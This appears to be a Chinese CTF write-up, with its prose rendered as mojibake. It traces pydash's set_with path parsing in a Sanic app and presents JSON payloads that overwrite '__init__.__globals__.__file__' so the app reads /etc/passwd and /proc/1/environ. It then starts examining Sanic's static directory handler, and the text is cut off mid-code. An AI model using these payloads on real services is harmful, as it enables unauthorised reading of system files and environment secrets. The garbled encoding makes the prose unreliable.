value)</span><br></pre></td></tr></table></figure><p>â€‹ç®—æ˜¯ï¼Œå¥½æ¶ˆæ¯å§ï¼Œç›´æ¥å°±çœ‹åˆ°äº† pathï¼Œæˆ‘ä»¬ä¼ å…¥çš„ key æˆ–è®¸å°±æ˜¯è¿™ä¸ªå« path çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿé‚£ä¸ªé“¾å­çœ‹èµ·æ¥ä¹Ÿå¾ˆåƒæ˜¯è·¯å¾„ã€‚å¥½ï¼Œæ²¡å•¥å†…å®¹ï¼Œè·Ÿè¿› <code>set_with(obj, path, value)</code> ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>â€‹ç›¯ç€ pathï¼Œç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>â€‹ç»§ç»­è·Ÿè¿› pathï¼Œä¼¼ä¹æ•´ä¸ªå‡½æ•°é‡Œå°±åªæœ‰ä¸€ä¸ªï¼š <code>tokens = to_path_tokens(path)</code> ï¼Œè¿˜æ˜¯æ— è„‘æ ¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™å„¿ä¸çŸ¥é“æ€ä¹ˆæ“ä½œäº†ï¼Œä½†æ˜¯è·Ÿè¿›  <code>RE_PATH_KEY_DELIM</code>  åå¾—åˆ°äº†ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹é—®äº†ä¸‹ aiï¼Œai çš„å›å¤ä¸­æœ‰ä¸€ç‚¹å„¿å€¼å¾—æ³¨æ„ï¼š</p><blockquote><p>è¯·æ³¨æ„ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åœ¨å¤„ç†å¤æ‚çš„è½¬ä¹‰åºåˆ—æ—¶å¯èƒ½ä¸æ˜¯å®Œç¾çš„ï¼Œç‰¹åˆ«æ˜¯å½“å­—ç¬¦ä¸²ä¸­åŒ…å«è¿ç»­çš„è½¬ä¹‰å­—ç¬¦ï¼ˆå¦‚  <code>\\\\.</code> ï¼‰ï¼Œè¿™äº›å­—ç¬¦å¯èƒ½æ„å›¾è¡¨ç¤ºä¸€ä¸ªå®é™…çš„ç‚¹å·ä½†å‰é¢æœ‰å¶æ•°ä¸ªåæ–œæ ã€‚æ­¤å¤–ï¼Œå¦‚æœç‚¹å·åé¢ç´§è·Ÿçš„æ˜¯å­—æ¯æˆ–å…¶ä»–éæ•°å­—å­—ç¬¦ï¼Œå®ƒä»ç„¶ä¼šè¢«åŒ¹é…ä¸ºåˆ†éš”ç¬¦ï¼Œå³ä½¿è¿™å¯èƒ½ä¸æ˜¯é¢„æœŸçš„ã€‚</p></blockquote><p>â€‹æˆ‘ä¸ªäººå·²ç»åˆ«æ— ä»–æ³•äº†ï¼Œç…§ç€å®ƒç»™çš„è¿™ä¸ªè¿™ <code>\\\\.</code>  è¯•ç€ç»•äº†ä¸€ä¸‹ï¼Œç»“æœæˆåŠŸäº†ï¼Œpayload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® src è·¯ç”±ï¼ŒæˆåŠŸè¯»å–åˆ°äº†æ–‡ä»¶ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/550d038c156f4d6b8438ed492ff66ab8.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¥½äº†ï¼Œç…§ç†æ¥è¯´ï¼Œè¿™ä¸ªé¢˜ç›®å¦‚æœè¿™æ ·çš„è¯å·²ç»æˆåŠŸäº†ï¼Œåˆ©ç”¨å¦‚ä¸‹ payload ç›´æ¥è¯»å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡å³å¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/proc/1/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/a9da93b14d1f46dba7baadaca4c8ba51.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä½†æ˜¯ï¼Œçœ‹äº†ä¸‹å¤§ä½¬ä»¬çš„ wp ä¼¼ä¹æœ‰å¦ä¸€ç§å§¿åŠ¿ï¼Œç®—æ˜¯ä¸€ç§éé¢„æœŸå§ã€‚</p><p><strong>ä¸‹é¢è·Ÿç€å¤§ä½¬ä»¬èµ°ï¼š</strong></p><p>â€‹å…ˆçœ‹å¦‚ä¸‹ä½ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¿› static ()ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    file_or_directory: <span class="type">Union</span>[PathLike, <span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    pattern: <span class="built_in">str</span> = <span class="string">r&quot;/?.+&quot;</span>,</span></span><br><span class="line"><span class="params">    use_modified_since: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    use_content_range: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    stream_large_files: <span class="type">Union</span>[<span class="built_in">bool</span>, <span class="built_in">int</span>] = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span> = <span class="string">&quot;static&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    strict_slashes: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    content_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    apply: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    resource_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    directory_handler: <span class="type">Optional</span>[DirectoryHandler] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a root to serve files from. The input can either be a file or a directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This method provides an easy and simple way to set up the route necessary to serve static files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        uri (str): URL path to be used for serving static content.</span></span><br><span class="line"><span class="string">        file_or_directory (Union[PathLike, str]): Path to the static file</span></span><br><span class="line"><span class="string">            or directory with static files.</span></span><br><span class="line"><span class="string">        pattern (str, optional): Regex pattern identifying the valid</span></span><br><span class="line"><span class="string">            static files. Defaults to `r&quot;/?.+&quot;`.</span></span><br><span class="line"><span class="string">        use_modified_since (bool, optional): If true, send file modified</span></span><br><span class="line"><span class="string">            time, and return not modified if the browser&#x27;s matches the</span></span><br><span class="line"><span class="string">            server&#x27;s. Defaults to `True`.</span></span><br><span class="line"><span class="string">        use_content_range (bool, optional): If true, process header for</span></span><br><span class="line"><span class="string">            range requests and sends  the file part that is requested.</span></span><br><span class="line"><span class="string">            Defaults to `False`.</span></span><br><span class="line"><span class="string">        stream_large_files (Union[bool, int], optional): If `True`, use</span></span><br><span class="line"><span class="string">            the `StreamingHTTPResponse.file_stream` handler rather than</span></span><br><span class="line"><span class="string">            the `HTTPResponse.file handler` to send the file. If this</span></span><br><span class="line"><span class="string">            is an integer, it represents the threshold size to switch</span></span><br><span class="line"><span class="string">            to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span></span><br><span class="line"><span class="string">            which means that the response will not be streamed.</span></span><br><span class="line"><span class="string">        name (str, optional): User-defined name used for url_for.</span></span><br><span class="line"><span class="string">            Defaults to `&quot;static&quot;`.</span></span><br><span class="line"><span class="string">        host (Optional[str], optional): Host IP or FQDN for the</span></span><br><span class="line"><span class="string">            service to use.</span></span><br><span class="line"><span class="string">        strict_slashes (Optional[bool], optional): Instruct Sanic to</span></span><br><span class="line"><span class="string">            check if the request URLs need to terminate with a slash.</span></span><br><span class="line"><span class="string">        content_type (Optional[str], optional): User-defined content type</span></span><br><span class="line"><span class="string">            for header.</span></span><br><span class="line"><span class="string">        apply (bool, optional): If true, will register the route</span></span><br><span class="line"><span class="string">            immediately. Defaults to `True`.</span></span><br><span class="line"><span class="string">        resource_type (Optional[str], optional): Explicitly declare a</span></span><br><span class="line"><span class="string">            resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span></span><br><span class="line"><span class="string">        index (Optional[Union[str, Sequence[str]]], optional): When</span></span><br><span class="line"><span class="string">            exposing against a directory, index is  the name that will</span></span><br><span class="line"><span class="string">            be served as the default file. When multiple file names are</span></span><br><span class="line"><span class="string">            passed, then they will be tried in order.</span></span><br><span class="line"><span class="string">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class="line"><span class="string">            the directory viewer when exposing a directory. Defaults</span></span><br><span class="line"><span class="string">            to `False`.</span></span><br><span class="line"><span class="string">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class="line"><span class="string">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class="line"><span class="string">            controlling and subclassing the behavior of the default</span></span><br><span class="line"><span class="string">            directory handler.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        List[sanic.router.Route]: Routes registered on the router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string">        Serving a single file:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        app.static(&#x27;/foo&#x27;, &#x27;path/to/static/file.txt&#x27;)</span></span><br></pre></td></tr></table></figure><pre><code>        Serving all files from a directory:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/static/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>        Serving large files with a specific threshold:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/large/files&#x27;</span>, stream_large_files=<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>    &quot;&quot;&quot;  # noqa: E501    name = self.generate_name(name)    if strict_slashes is None and self.strict_slashes is not None:        strict_slashes = self.strict_slashes    if not isinstance(file_or_directory, (str, bytes, PurePath)):        raise ValueError(            f&quot;Static route must be a valid path, not &#123;file_or_directory&#125;&quot;        )    try:        file_or_directory = Path(file_or_directory).resolve()    except TypeError:        raise TypeError(            &quot;Static file or directory must be a path-like object or string&quot;        )    if directory_handler and (directory_view or index):        raise ValueError(            &quot;When explicitly setting directory_handler, you cannot &quot;            &quot;set either directory_view or index. Instead, pass &quot;            &quot;these arguments to your DirectoryHandler instance.&quot;        )    if not directory_handler:        directory_handler = DirectoryHandler(            uri=uri,            directory=file_or_directory,            directory_view=directory_view,            index=index,        )    static = FutureStatic(        uri,        file_or_directory,        pattern,        use_modified_since,        use_content_range,        stream_large_files,        name,        host,        strict_slashes,        content_type,        resource_type,        directory_handler,    )    self._future_statics.add(static)    if apply:        self._apply_static(static)</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â€‹æ³¨é‡Šé‡Œé¢å­˜åœ¨è¿™ä¸¤å¥è¯ï¼š</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">            directory_view (bool, optional): Whether to fallback to showing</span><br><span class="line">                the directory viewer when exposing a directory. Defaults</span><br><span class="line">                to `False`.</span><br><span class="line">            directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class="line">                instance of DirectoryHandler that can be used for explicitly</span><br><span class="line">                controlling and subclassing the behavior of the default</span><br><span class="line">                directory handler.</span><br></pre></td></tr></table></figure><p>â€‹å¤§è‡´æ„æ€å°±æ˜¯ directory_view ä¸º True æ—¶ï¼Œä¼šå¼€å¯åˆ—ç›®å½•åŠŸèƒ½ï¼Œdirectory_handler ä¸­å¯ä»¥è·å–æŒ‡å®šçš„ç›®å½•ã€‚è·Ÿè¿›ä¸‹ <code>directory_handler</code>  ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> directory_handler:</span><br><span class="line">    directory_handler = DirectoryHandler(</span><br><span class="line">        uri=uri,</span><br><span class="line">        directory=file_or_directory,</span><br><span class="line">        directory_view=directory_view,</span><br><span class="line">        index=index,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>â€‹å†è·Ÿè¿› <code>DirectoryHandler</code> ï¼Œå‘ç°å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        directory: Path,</span></span><br><span class="line"><span class="params">        directory_view: <span class="built_in">bool</span> = <span 